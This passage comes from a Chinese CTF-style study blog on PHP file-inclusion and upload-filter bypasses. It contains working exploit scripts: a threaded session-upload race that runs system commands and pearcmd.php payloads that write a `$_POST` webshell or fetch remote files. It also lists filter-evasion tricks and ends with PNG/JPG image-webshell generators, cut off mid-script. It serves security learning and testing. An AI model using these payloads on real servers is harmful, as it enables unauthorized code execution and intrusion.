class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">3</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Getting initial offset...&quot;</span>,  <br>    <span class="hljs-comment">###设置POST包格式</span><br>    reqphp, tag, reqlfi = setup(host, port)<br>    <span class="hljs-comment">###读出tmp_name所在位置</span><br>    offset = getOffset(host, port, reqphp)<br><br>    sys.stdout.flush()<br><br>    maxattempts = <span class="hljs-number">1000</span><br>    e = threading.Event()<br>    l = threading.Lock()<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz<br>    sys.stdout.flush()<br><br>    tp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,poolsz):<br>        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))<br><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.start()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.wait(<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> e.is_set():<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">with</span> l:<br>                sys.stdout.write( <span class="hljs-string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))<br>                sys.stdout.flush()<br>                <span class="hljs-keyword">if</span> counter &gt;= maxattempts:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span><br>        <span class="hljs-keyword">if</span> e.is_set():<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Woot!  \m/&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;:(&quot;</span><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nTelling threads to shutdown...&quot;</span><br>        e.<span class="hljs-built_in">set</span>()<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Shuttin&#x27; down...&quot;</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>
<h3 id="php的session文件包含">php的session文件包含</h3>
<p>cookie与session基本知识补充：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40228200/article/details/127977296">https://blog.csdn.net/weixin_40228200/article/details/127977296</a></p>
<p><a target="_blank" rel="noopener" href="https://gezhigu.blog.csdn.net/article/details/133805025?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-133805025-blog-116228070.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-133805025-blog-116228070.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;utm_relevant_index=1">https://gezhigu.blog.csdn.net/article/details/133805025?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-133805025-blog-116228070.235^v43^pc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-133805025-blog-116228070.235^v43^pc_blog_bottom_relevance_base2&amp;utm_relevant_index=1</a></p>
<p>简单理解：</p>
<p>session可以跨页面共享数据，session文件的名称可以通过Cookie获得，可以通过上传<code>PHP_SESSION_UPLOAD_PROGRESS</code>表单来写session文件；</p>
<p>但session文件内容会在一次会话结束后自动清除，可以通过多线程来实现边写边读，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-- coding:UTF-8 --</span><br><span class="hljs-comment"># Author:dota_st</span><br><span class="hljs-comment"># Date:2021/2/20 23:51</span><br><span class="hljs-comment"># blog: www.wlhhlc.top</span><br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br>url = <span class="hljs-string">&#x27;xx&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    data = &#123;<br>        <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;dotast&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">10</span>)    <span class="hljs-comment">#文件内容，10kB的a</span><br>        response = session.post(url,cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: <span class="hljs-string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;dota.txt&#x27;</span>, f)&#125;)<br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(url+<span class="hljs-string">&#x27;?file=/tmp/sess_flag&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;dotast&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;retry&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    session = requests.session()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        threading.Thread(target=write, args=(session,)).start()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        threading.Thread(target=read, args=(session,)).start()<br></code></pre></td></tr></table></figure>
<h3 id="pear文件包含">pear文件包含</h3>
<p><strong>知识点：</strong></p>
<p>pear，全称PIP EXTENSION AND APPLICATION REPOSITORY，php包管理工具</p>
<p>默认安装位置：/usr/local/lib/php</p>
<h4 id="利用条件">利用条件</h4>
<ol>
<li>有文件包含点</li>
<li>开启了pear拓展</li>
<li>配置文件中<code>register_argv-argc</code>（argv、argc存储命令行参数和参数个数）设置为On,当开启了这个选项，用户的输入将会被赋予给$argc、$argv、$_SERVER[‘argv’]几个变量。</li>
</ol>
<h4 id="利用点">利用点</h4>
<p><strong>知识点：</strong></p>
<p>​	当不使用命令行形式处理php文件时，HTTP数据包中的query-string（不包含没有编码的<code>=</code>，且请求是GET或HEAD）会处理为$_SERVER[‘argv’]中的值，也就是命令行参数。</p>
<p>​	所以我们可以通过Web访问pear命令行的功能，且能够控制命令行参数。</p>
<p>pear中可以利用的参数：</p>
<ol>
<li>config-create:</li>
</ol>
<p>这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
<p>payload:</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">url<span class="hljs-regexp">/?+config-create+/</span>&amp;<span class="hljs-keyword">file</span>=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>php<span class="hljs-regexp">/pearcmd.php&amp;/</span>&lt;?=phpinfo()?&gt;+<span class="hljs-regexp">/tmp/</span>hello.php<br></code></pre></td></tr></table></figure>
<p>将内容<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?</code>写入<code>/tmp/hello.php</code>文件。</p>
<p>由于<code>$_SERVER['argv']</code>变量会将URL的<code>?</code>后面的值都传入pear当作参数，所以此处<code>file</code>需要调换一下位置，GET请求中的file的值保持不变。</p>
<p>pear命令的处理是送argv[1]开始的。<code>+</code>不可忽略，相当于argv[0]是一个空参数。</p>
<ol start="2">
<li>install：</li>
</ol>
<p>远程文件下载，<code>install -R 下载到的路径 http://xxx(远程文件的位置)</code></p>
<p>payload:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/lib/php</span><span class="hljs-regexp">/pearcmd.php&amp;+install+-R+/tmp</span>+<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/xxx/</span><br></code></pre></td></tr></table></figure>
<ol start="3">
<li><img src="/2024/12/03/Web/1733230982721.png" srcset="/img/loading.gif" lazyload alt="1733230982721"></li>
</ol>
<p>生成临时文件，里面含有配置项加内容。<code>-c</code>指定文件保存路径，<code>-d</code>写配置项内容，<code>-s</code>保存</p>
<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>php<span class="hljs-regexp">/pearcmd.php&amp;+-c+/</span>tmp/<span class="hljs-number">1</span>.php+-d+man_dir=&lt;?=<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];?&gt;+-s<br></code></pre></td></tr></table></figure>
<p>可以参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x05-segfaulttemp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x05-segfaulttemp</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mrs_H/article/details/122386511%E9%87%8C%E9%9D%A2%E7%9A%84%E6%80%9D%E8%80%83">https://blog.csdn.net/Mrs_H/article/details/122386511里面的思考</a></p>
<h2 id="php文件上传">php文件上传</h2>
<h3 id="强制文件上传机制">强制文件上传机制</h3>
<p>POST上传文件到指定目录时，除了生成临时文件外，上传文件的信息存储在该文件的全局变量$_FILE（二维数组）中，键名（二维数组索引）为文件上传表单设定的名称,如<input name="file" type="xx">中的file。</p>
<ul>
<li>利用$_FILE变量得到上传文件的相关信息：</li>
</ul>
<p>‘name’（一维数组索引） : 对应文件名</p>
<p>‘tmp_name’ : 上传文件存储的临时目录</p>
<p>‘type’ : 文件类型</p>
<ul>
<li>利用move_upload_file(原目录，指定目录)来实现真正上传</li>
</ul>
<p>例如：move_upload_file($file[‘tmp_name’],“/upload/”.$file[‘name’]);</p>
<h3 id="文件上传绕过">文件上传绕过</h3>
<h4 id="替换xx为空">替换xx为空</h4>
<p>例如替换php为空，可以采用双写绕过，xx.pphphp =&gt; xx.php</p>
<p>也可以采用php3、php5、phps、phtml等</p>
<h4 id="00截取">%00截取</h4>
<p>%00视为字符串的结尾；</p>
<p>例如：123.php%00.jpg；在判断上传文件类型时，识别最后一个后缀为jpg；而在写文件上传路径时，由于%00截断的存在，只写入123.php。</p>
<p>适用版本：php版本低于5.3.4；java版本小于7u40</p>
<h4 id="iconv字符转换异常后造成字符截断">iconv字符转换异常后造成字符截断</h4>
<p>utf-8编码范围为0x00-0x7f；</p>
<p>当使用iconv转换时，如果遇到字符的范围不在上述之中，低版本的php汇报异常且不再处理后续字符，造成截断；</p>
<p>例如：123.php%df.jpg =&gt; 123.php</p>
<h4 id="文件后缀为白名单的绕过">文件后缀为白名单的绕过</h4>
<p>基于web服务器的解析漏洞绕过：</p>
<h5 id="IIS">IIS</h5>
<p>windows自带的web服务器；</p>
<p>如果解析的目录名字为<code>xxx.asp(类似php)</code>，该目录下的所有文件（无论什么后缀）均按照asp来解析;</p>
<p>适用版本：IIS6.0(Windows XP/server 2003)。</p>
<h5 id="nginx">nginx</h5>
<p>基于错误的nginx和php-fpm配置，当访问123.txt/123.php，php-fpm中的cgi.fix_pathinfo(默认开启)找不到123.php时，会找到/前面的文件来进行php解析。</p>
<p>利用方式：上传123.txt文件（包含恶意php代码），访问/123.txt/123.php路径。</p>
<h5 id="apache">apache</h5>
<ul>
<li>多后缀解析漏洞</li>
</ul>
<p>当apache遇到不认识的后缀时，会继续往前找后缀，找到认识的后缀后解析执行</p>
<p>例如：<a target="_blank" rel="noopener" href="http://123.php.rs">123.php.rs</a> =&gt; 123.php</p>
<ul>
<li>ImageMagic组件白名单绕过</li>
</ul>
<p>条件：ImageMagic版本小于等于3.3.0；php版本大于5.4；启用ImageMagic插件；通过php new ImageMagic 对象的方式来处理图片</p>
<p>利用：上传特定的svg图片</p>
<h3 id="高级文件绕过">高级文件绕过</h3>
<h4 id="自定义配置文件上传">自定义配置文件上传</h4>
<p>通过上传特定格式的配置文件来修改php解释器的各项功能；</p>
<p>nginx默认使用<code>.user.ini</code>配置文件，其他的配置文件还有<code>.htaccess</code>和<code>nginx.htaccess</code></p>
<p>通过在<code>.user.ini</code>中利用<code>auto_append_file=xx</code>函数，自动在php文件后面添加xx文件并解释执行</p>
<h4 id="服务端内容检测">服务端内容检测</h4>
<p>二分法确认被检测的关键字，进行替换；</p>
<p>可以利用$_COOKIE全局变量（过滤GET、POST、REQUEST）,由于cookie值中不能使用<code>;</code>，可以借助base64编码</p>
<h4 id="配合伪协议-日志文件来绕过">配合伪协议/日志文件来绕过</h4>
<p>如果找不到替换；</p>
<p>可以采用伪协议来作为文件目录，例如：auto.append.file=php://input；在post中提交恶意代码</p>
<p>可以采用日志文件来作为文件目录，例如：auto.append.file=/var/www/html/access.log；在User-Agent中提交恶意代码。</p>
<h4 id="上传html文件来进行跨站脚本攻击（xss）">上传html文件来进行跨站脚本攻击（xss）</h4>
<p>待探索。</p>
<h4 id="getimagesize函数绕过">getimagesize函数绕过</h4>
<p>题目采用getimagesize()函数来检测是否为图片上传。</p>
<p>利用XBM格式的图片，长宽高采用如下方式定义：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//define %s %d</span><br><span class="hljs-comment">#define width 1</span><br><span class="hljs-comment">#define height 1</span><br></code></pre></td></tr></table></figure>
<p>利用，上传user.ini文件时加上上述两行，伪装为图片，绕过getimagesize检测。</p>
<h4 id="PNG、JPG二次渲染绕过">PNG、JPG二次渲染绕过</h4>
<ul>
<li>
<p>什么是二次渲染？<br>
目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作（如PHP中的<code>imagecreatefromjpeg()</code>等函数），所以普通的图片马都难逃被渲染的悲剧。</p>
</li>
<li>
<p>绕过</p>
<ul>
<li>
<p>GIF</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">渲染前后的两张 GIF，没有发生变化的数据块部分直接插入 Webshell 即可<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>PNG</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">PNG</span> 没有 GIF 那么简单，需要将数据写入到 PLTE 数据块 或者 IDAT 数据块<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>JPG</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">JPG </span>需要使用脚本将数据插入到特定的数据块，而且可能会不成功，所以需要多次尝试 <br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>以下是通过写IDAT数据块生成图片马的脚本：（PNG二次渲染绕过）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;2.png&#x27;</span>);  <span class="hljs-comment">//要修改的图片的路径</span><br></code></pre></td></tr></table></figure>
<p>对生成的图片进行分析：</p>
<p><img src="/2024/12/03/Web/1733881606748.png" srcset="/img/loading.gif" lazyload alt="1733881606748"></p>
<p>成功写入payload，需要有文件包含点（例如查看上传的图片），传参两个变量即可，这里通常需要抓包查看回显，浏览器无法直接渲染回显信息。</p>
<p>以下是JPG二次渲染绕过的图片马生成的脚本：</p>
<p>由于jpg图片易损，对图片的选取有很高要求，很容易制作失败，需要多次尝试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span 